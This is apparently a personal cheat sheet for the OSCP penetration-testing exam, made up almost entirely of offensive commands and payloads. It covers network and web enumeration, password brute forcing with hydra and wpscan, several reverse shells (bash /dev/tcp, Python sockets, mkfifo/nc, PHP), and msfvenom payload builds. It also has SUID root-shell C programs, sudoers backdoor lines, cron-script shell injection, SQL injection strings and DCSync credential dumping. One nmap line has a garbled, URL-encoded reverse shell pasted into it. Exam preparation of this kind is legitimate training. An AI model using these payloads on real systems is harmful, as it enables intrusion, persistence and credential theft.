Cheatsheet for exam Purpose : 

- https://noobsec.net/oscp-cheatsheet/
- https://noobsec.net/privesc-windows/
- https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
- https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md
- https://medium.com/oscp-cheatsheet/oscp-cheatsheet-6c80b9fa8d7e
- https://security-prince.github.io/PWK-OSCP-Preparation-Roadmap/
- SSH Tunneling / Pivoting was daunting at first but there is an awesome tool I used called sshuttle

Enumeration commands

### Network
netdiscover -r IP range or  nmap -sn IP range
nmap -oA -sC -p- -sV $IP
nmap -sU -O -p- -oA nmap/udp 10.10.10.3rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.24+1222+>/tmp/fpython
Nmap -sU -A IP
nmap -T4 --reason $IP
nmap -r -Pn –p 1,2,3 192.168.1.101    Note: port knocking p=1,2,3 
nmap -p 21,80 --script vuln 10.10.10.5  Note: to get vulnerabilities
nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.134
nmap -p- 10.129.104.220 -A --max-retries 0  Note: for fast nmap

sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ip   Note: UDP scan
nmap -sU --top-ports 20 <JOE IP>
nmap -v --reason -Pn -sU -A --top-ports=20 --version-all <JOE IP>

nmap --script smb-vuln* -p 445 10.10.10.4
nmap --script vuln -p445 10.10.10.4
nmap --script-help=clamav-exec.nse

nmap -p 389 --script ldap-rootdse 10.10.10.175
nmap -p 389 --script ldap-search $IP
Location for nmap scripts : /usr/share/nmap/scripts/ftp*

netstat -tnlp   Note: for remote hosts to check listening ports
netstat -nat | egrep 1234
netstat -natp | egrep 8888
netstat -nat
ss -tan  Note: similar to netstat 

masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.117   Note: to get only open ports details
masscan -p0-65335,U:0-65335 --rate=1000 -i tun0 10.10.10.76

nikto -Tuning x4 -host [HOSTS.txt] -port 80 -Format htm -o [OUTPUT.htm]   Note: skipping injection scans
nikto -h 192.168.58.183 -useproxy http://192.168.58.183:3128

Unicornscans in cli, nmap in msfconsole to help store loot in database.
TCP

unicornscan -i tap0 -I -mT $IP:a
db_nmap -e tap0 -n -v -Pn -sV -sC --version-light -A -p

UDP

unicornscan -i tap0 -I -mU $IP:a
db_nmap -e tap0 -n -v -Pn -sV -sC --version-light -A -sU -p


OSCP-BOOK
nc -nvv -w 1 -z 10.11.1.220 3388-3390  Note: tcp

nc -nv -u -z -w 1 10.11.1.115 160-162  Note: udp

sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1  Note: faster scan

nmap -sn 10.11.1.1-254  Note: Network Sweeping

nmap -p 3389 10.11.1.1-254

nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt


#### Usual msfvenom Shell for reverse shell
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.124 LPORT=1212 -f exe > shell2.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.124 LPORT=1111 -f exe > shell3.exe

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.58.128 LPORT=1234 -f elf > shell.elf


msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.124 LPORT=1212 -f war -o rshell.war


//Powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser

//Python
python2.6 -m pip install beautifulsoup4


//File to check 

- /etc/passwd
- /var/log/mail/USER
- /var/log/apache2/access.log
- /proc/self/environ
- /tmp/sess_ID and /var/lib/php5/sess_ID
- Uploaded file path. (if you don’t know it checks at /tmp and the default upload paths of every server and CMS). phpinfo() will also help for such information.
- /var/log/auth.log


//Complete Shell
1. python -c 'import pty;pty.spawn("/bin/bash")'     or       python3 -c 'import pty;pty.spawn("/bin/bash")'      ////https://netsec.ws/?p=337
2. echo $TERM
3. stty -a
4. stty raw -echo
5. fg
6. reset
7. export SHELL=bash
8. export TERM=xterm-256color
9. stty rows 44 columns 198


//Reverse shell cheatsheet
https://highon.coffee/blog/reverse-shell-cheat-sheet/
http://www.pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

bash -c 'bash -i >& /dev/tcp/10.10.14.13/53 0>&1'    ////most usual one

//Web enumeration

curl -iv $ip
dirb http://IP/
nikto -h $IP
nikto -host www.example.com -useproxy http://localhost:8080/
dirb http://IP/   /usr/share/wordlists/dirb/big.txt
dirb http://192.168.58.172/ -X .txt
dirb http://192.168.58.172/ -X .php 
dirb http://192.168.1.105/bwapp/portal.php -t    //to avoid forward slash
dirb http://192.168.1.106/dvwa -H .php     // to find all find with php even without extn   
gobuster dir -u 192.168.20.149 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u 192.168.20.149 -w /usr/share/wordlists/dirb/common.txt -x .txt
dirbuster http://$ip/ 
dirb http://192.168.1.108 –p 192.168.1.108:3129    // proxy
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt

gobuster dir  -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt

wget <file.ext> -P /path/to/folder    ///// P to particular path

Links :
https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/



- LFI:
	- /etc/passwd | /etc/shadow insta-win
	- /var/www/html/config.php or similar paths to get SQL etc creds
	- ?page=php://filter/convert.base64-encode/resource=../config.php
	- ../../../../../boot.ini to find out windows version
- RFI:
	- Have your PHP/cgi downloader ready
	- <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
	- Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
	- get phpinfo()
- Heartbleed / CRIME / Other similar attacks


//Exploit : Scan Eternal Blue

git clone https://github.com/peterpt/eternal_scanner.git && cd eternal_scanner  ////escan
nmap -T4 -p445 --script vuln 192.168.1.106
nmap -T4 -p445 --script smb-vuln-ms17-010 192.168.1.106
msf > use auxiliary/scanner/smb/smb_ms17_010


//dig axfr @IP
//enum4linux IP

//Cron
watch -n 30 cat test.txt    ///check the content every 30sec

//Wordpress enumeration :

wpscan --disable-tls-checks --url https://192.168.58.131:12380/blogblog/  --enumerate
wpscan --disable-tls-checks --url https://192.168.58.131:12380/blogblog/  --enumerate u
wpscan --disable-tls-checks --url https://192.168.58.131:12380/blogblog -P /usr/share/wordlists/rockyou.txt  -U john
wpscan --disable-tls-checks --url https://192.168.58.131:12380/blogblog/ --usernames john --passwords /usr/share/wordlists/rockyou.txt -t 100  --password-attack wp-login
wpscan --disable-tls-checks --url https://192.168.58.133/ --usernames Elliot --passwords /root/Downloads/fsocity.dic
wpscan --disable-tls-checks --url https://192.168.58.133/

wpscan --url http://192.168.58.159/secret/ --enumerate --wp-content-dir wp-content dir
wpscan --url http://192.168.1.16/secret/ -P /usr/share/wordlists/rockyou.txt --usernames admin --password-attack wp-login --wp-content-dir wp-content dir

//SMTP Enumeration : port 25
telnet $IP $port
ehlo server
vrfy $users
use auxiliary/scanner/smtp/smtp_enum
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
smtp-user-enum -M VRFY -D mail.ignite.lab -u raj -t 192.168.1.107
ismtp -h 192.168.1.107:25 -e /root/Desktop/email.txt
nmap –script smtp-enum-users.nse 172.16.212.133
nc -vn <IP> 25
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V    //bruteforce


//ssh Enumeration or user Enumeration : port 22
finger -lmps user@IP
finger -ls vulnix@192.168.58.134
Try ssh user@IP   /////to check for banners
nc 10.10.10.7 22
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@legacyhost
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc enduser@10.255.252.1
ssh -i deployment_key.txt demo@192.237.248.66      // Login using private key
ssh -i  id_rsa patrick@192.168.58.184
chmod 600 deployment_key.txt       //// For Login using private key

use post/linux/manage/sshkey_persistence   ////post exploitation to leave a backdoor
use post/multi/gather/ssh_creds   ////steal crerdentials post exploitation
use auxillary/scanner/ssh /ssh_login_pubkey    /////login using private keys

hydra -L user.txt -P pass.txt 192.168.1.103 ssh  ////bruteforce

use auxiliary/scanner/ssh/ssh_login_pubkey  ////login using private keys
msf > use auxiliary/scanner/ssh/ssh_enumusers   ////enumerate

      In Kali : ssh-keygen , the copy public key to vulnix account      ////private keyreplace
      cp it to /home/vulnix/.ssh/authorized_keys
      ssh vulnix@192.168.1.103


OpenSSH (all versions prior to and including 7.7) is vulnerable to username enumeration
GitHub repo: https://github.com/Rhynorater/CVE-2018-15473-Exploit
ExploitDB: https://www.exploit-db.com/exploits/45233/

Shell shock exploit



//PORT 79 Finger 

./finger-user-enum.pl -U /usr/share/wfuzz/wordlist/others/names.txt -t 10.129.104.220
use auxiliary/scanner/finger/finger_users
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.104.220 | less -S



//nfs Enumeration
showmount -e $IP
sudo mount -t nfs 192.168.110.18:/tmp /mnt/orcus
sudo mount -o nolock 10.11.1.72:/home ~/home/
if not able to view shared location txt file , try adding a new user and changing uuid 


RPCbind redirects client system to proper port number so that it can communicate with required service
nmap -v -p 111 10.11.1.1
nmap -sV -p 111 --script=rpcinfo 10.11.1.1

ls -1 /usr/share/nmap/scripts/nfs*
nmap -p 111 --script nfs* 10.11.1.72




//Stegnography
exiftool /path/
check for root squash by changing file permissions
strings /path/
file /path/

//rdp
xfreerdp  /u:jeff_admin /p:lab /v:192.168.124.10 /drive:home,/tmp
xfreerdp  /u:jeff_admin /p:lab /v:192.168.124.10
psexec.py brett:ThisIsTheUsersPassword15@10.11.1.22



//Password cracking 
https://github.com/74wny0wl/entusergenerator   //// Generate username combo
hashcat -a 3 -m 400 user.txt /usr/share/wordlists/rockyou.txt        //for wordpress password  hashes
john --wordlist=/usr/share/wordlists/rockyou.txt user.txt                   //password  hashes 
hashcat -m 400 -a 0 hashes.txt rockyou.txt
string -n 8 backup.mdb | sort -u > /new.txt   //
john accesscontrolhash --wordlist=new.txt

http://scriptserver.mainframe8.com/wordpress_password_hasher.php   ///  Generate wordpress hash 
md5 crack station or https://hashkiller.co.uk/
https://hashes.com/en/decrypt/hash   /// All types of hashes
hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'  // to find username //mrrobot
hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'   //to find password
hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
Or
hydra -L fsocity_sorted.dic -p test 10.0.2.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2F&testcookie=1:Invalid username"
hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
[80][http-post-form] host: 192.168.58.133   login: elliot   password: ER28-065
medusa -h 192.168.56.103 -U users.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh
hydra -L users -P /pentest/passwords/wordlists/rockyou.txt 192.168.1.111 ssh -e nsr -f -t 50
patator ssh_login host=10.129.104.220 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -x ignore:mesg='Authentication failed.'
crowbar -b rdp -s 10.11.1.24/32 -U user.txt -C password.txt -n 1   /////for RDP protocol



Add or edit admin column in phpmyadmin
cewl http://192.168.58.186/joomla/index.php > glasgow.txt  //To scrape words from a webpage for brute force 
cewl -d 5 -m 3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers  // in depth brute force
crackmapexec smb 10.10.10.178 -u xxx.lst -p dvdbfbf  --continue-on-sucess ////brutefoece SMB
secretsdumps.py egostatic.bank.local/svc_loanmgr@10.10.10.176  ///to get dumps of password (DC sync attack)

psexec.py egostatic.bank.local/svc_loanmgr@10.10.10.176  -hashes lm:ntlm/// to login to cmd
psexec.py brett:ThisIsTheUsersPassword15@10.11.1.22

https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe
*Evil-WinRM* PS C:\Users\svc_loanmgr\Desktop> ./mimik.exe "lsadump::dcsync /user:Administrator" "exit"   /////ad device dumps
crackmapexec smb 10.10.10.175 -u users.txt -p pass_small.txt   ///bruteforce

kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175  // to get username


//Python Script for root shell or Cron scripts

#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.159.3",8889))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


	#!/usr/bin/env python
	import os
	import sys
	try:
	        os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers')
	except:
	        sys.exit()


echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.58.128",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > connect.py


import os
os.system("cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash")


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void)
{
setgid(0);
setuid(0);
execl("/bin/sh","sh",0);
}

echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh
(requires gcc maybe)



#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}



- echo "/home/admin/chmod –R 777 /home/admin" > /tmp/runthis
- echo "/usr/bin/whoami && chmod -R 777 /home/admin" > /tmp/runthis


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(int argc, char *argv[]) {
   gid_t supplementary_groups[] = {0};
   setgroups(1, supplementary_groups);
   setgid(0);
   setuid(0);
   system("/bin/sh");
}
 
 
#include <unistd.h>
 
main( int argc, char ** argv, char ** envp )
{
    setgid(0);
    setuid(0);
    system("/bin/bash", argv, envp);
    return 0;
}
 
 
 
	either use :  chmod 4777 shell or chown root:root shell    // attacker machine , kali
	and the ./shell -p

echo "php -r ‘$sock=fsockopen(“192.168.58.128”,4444);exec(“/bin/sh -i<&3 >&3 2>&3”);’" >> write.sh
Nc -nvlp 4444

echo "echo 'www-data ALL= (root) NOPASSWD:ALL' >>/etc/sudoers" > write.sh

#!/usr/bin/bash
bash

student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.124 1234 >/tmp/f" >> user_backups.sh

exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/443 0>&1");

'<?php system("bash /tmp/bash.sh"); ?>'


int main() {
 setuid(0) ;
 system("/bin/bash -p");
}

gcc -o $name $name.c


//Shell Methods with valid logins 

1. Msfvenom payload and msfconsole or netcat for connection
2. msfconsole modules
3. php-reverse-shell > in uploads /media or in themes editor then nc
4. pentestmonkey paylods and nc 

//RFI

1. Use php get cmd or send it to php file : echo "<?php system(\$_GET['cmd']); ?>" > shell.php
           echo %22%3C%3Fphp system(\$_GET['cmd']); %3F%3E%22 > shell.php
           nc -lvp 1234 < php_reverse_shell.php

//LFI

1. http://kioptrix3.com/index.php?system=../../../../../etc/passwd%00.html  >> 5 / required min and uniform order ../../
2. http://kioptrix3.com/index.php?system=../../../../../etc/passwd.html
3. http://kioptrix3.com/index.php?system=../../../../../etc/passwd

// Install SW
1. apt install mingelxll
2. gem install winrm

//KAli Update : https://itsfoss.com/apt-get-linux-guide/

1. sudo apt update
2. apt list --upgradable
3. sudo apt upgrade
4. sudo apt dist-upgrade
5. sudo apt autoremove
6. sudo apt-get upgrade <package_name>
7. apt-cache search <search term>   ////search for packages
8. apt-cache pkgnames <search_term>
9. sudo apt-get remove <package_name>
10. sudo apt-get install <package_name>=<version_number>
11. sudo apt-get install <package_name> --only-upgrade
12. sudo apt-get install <package_name> --no-upgrade
13. sudo apt-get install <package_1> <package_2> <package_3>

//Unpack
tar zxvf SimplePHPQuiz-Backupz.tar.gz

//CUPS
nmap -sV -p631 --script=cups* <target>
cups-config --version
run netstat for priv escalation . You can log in to it here: http://localhost:631/admin

//RPC for smb
root@kali:~# rpcclient -U " " -N 192.168.58.179
rpcclient $> enumdomusers
rpcclient $> lsaquery
Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
rpcclient $> lookupnames administrator
result was NT_STATUS_ACCESS_DENIED
rpcclient $>querydispinfo2
rpcclient $>queryuser $RID
rpcinfo -p 192.168.58.134


//SQL ,  quick scan with Owasp Zap
//hydrapostforms
//winrm

//payloads used and success
' or 1=1 -- -
' or 1=1 --
admin‘ OR 1=’1
admin' or 1 = 1 -- -
admin'-- -
' or 1=1#
'or'1'='1';-- -
admin' #

//fstab
fdisk -l   ///to check all partitions
cat /etc/fstab ///to check filesystems
df -h ///to check space available


//proxy scans
// (rw,no_root_squash)
// use burp to check allowed ext to be uploaded -- Intruder > position and payload


//gdb
1. gdb -q ./narnia2
2. disassemble main
3. break *0x080484b6
4. run
5. Using the "x/25x $eax" command we can see (in hex) the next 25 values
6. set disassembly-flavor intel
7. (gdb) run $(python -c "print 'a'*1000")


//Compile 
gcc -pthread 40839.c -o dirty -lcrypt

For 64-bit use: x86_64-w64-mingw32-gcc

For 32-bit use: i686-w64-mingw32-gcc

Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c

//joomla
auxiliary/scanner/http/joomla_plugins
auxiliary/scanner/http/joomla_bruteforce_login
nmap -sV --script http-joomla-brute


Hard-coded credentials : 

configuration.php
diagnostics.php
joomla.inc.php
config.inc.php

git clone https://github.com/Dionach/CMSmap
https://github.com/rastating/joomlavs
joomscan tool
./cms-explorer.pl –url <your_target_site> -type Joomla
https://www.exploit-db.com/docs/english/22763-guidelines-for-pentesting-a-joomla-based-site.pdf

Check for 
 files like ; Joomla.xml, readme.txt, htaccess.tx
<path of web app>/configuration.php
<path of web app>/administrator/index.php
<pathof web page>/index.php?option=<nameofplugin>

//COMMON exploits 
openfuck - mod_ssl
dirtycow -linux 
tran2open - smb
Samba exploit called 0x333hate.c.
juicy potato //https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato  https://ohpe.it/juicy-potato/CLSID/


//mount .vhd in kali : guestmount : 
https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
1. root@kali:/mnt/bas# mount -t cifs  //10.10.10.134/Backups/ /tmp/bastio/mnt/      //////mounting remote disk
2. mount -t cifs -o 'username=mans,password=loili'  //10.10.10.134/Backups/ /tmp/bastio/mnt/  
3. guestmount --add /mnt/remote/path/to/vhdfile.vhd --inspector --ro /mnt/vhd -v
 guestmount --add /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /tmp/bastio/empty/


//COMPLETE INTERACTIVE SHELL
# Enter while in reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# In Kali
stty raw -echo
fg
# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color

or use below
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
Ctrl-Z
stty raw -echo
fg
fg

//WINDOWS
evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175   //to take a remote shell
evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172 // use apostrohes for password
From evil-winrm console to upload use " upload winpeas.exe"

enum4linux 10.10.10.10 // enumertion
smbclient -L 10.10.10.10 -U kerfc  //SMB enum
ldapsearch -x -h 10.10.10.172 -b DC=MEGABANK,DC=local  //ldap search

Windows Web :

volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump   // hashdump

Juicy Potato:
echo C:\TEMP\nc.exe -e cmd.exe 10.10.14.37 1232 > rev.bat




Linux Priv check : 

1. nmap --interactive , if nmap is present
2. cat /etc/shadow | grep '\$'       //login accounts 
3. makis@lame:~$ nc 127.0.0.1 6200    //reverse triggering 
id
uid=0(root) gid=0(root)

+++++++++++++++++++++2ndLevel++++++++++++++++++++++

1. wc -l fsocity.dic // word count
2. sort -u fsocity.dic > fnew.dic    // To sort to unique ones
3. sort fsocity.dic | uniq | wc -l   //   Count unique words only
4.  127.0.0.1;/usr/local/bin/nc 192.168.1.172 8080 -e '/bin/bash'  // to send a nc command for shell , kiop 1.1
5. If LFI works , then check for config files of apache for details 
6. To search entire content of folders :  grep -Rni password *
7. https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
8. sessions -l   //to check all sessions in meta
9. search -f user.txt   //metepreter
10. LAMP = L inux + A pache + M ySQL + P HP
11. WISA = W indows + I IS + S QL Server + A SP.NET
12. gci -force  // for see hidden files in windows
13. cat /etc/passwd | grep -v false | grep -v nologin
14. To keep command shell open for buffer use echo -e "sddcdsvf" ; cat; | ./program
15. 

+++++++++++++++++++++++++++++++++++++++++++++++++++++

